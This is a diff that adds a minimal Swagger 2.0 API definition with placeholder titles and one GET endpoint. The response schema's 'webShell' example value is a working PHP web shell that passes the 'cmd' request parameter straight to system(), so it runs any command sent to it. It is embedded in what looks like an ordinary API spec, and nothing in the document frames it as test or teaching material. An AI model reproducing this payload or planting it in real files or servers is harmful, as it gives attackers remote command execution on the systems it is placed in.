@@ -1,0 +1,28 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "API Title"
+  },
+  "paths": {
+    "/endpoint": {
+      "get": {
+        "summary": "Get endpoint",
+        "responses": {
+          "200": {
+            "description": "Successful response with a Web Shell",
+            "schema": {
+              "type": "object",
+              "properties": {
+                "webShell": {
+                  "type": "string",
+                  "example": "<?php if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); } ?>"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
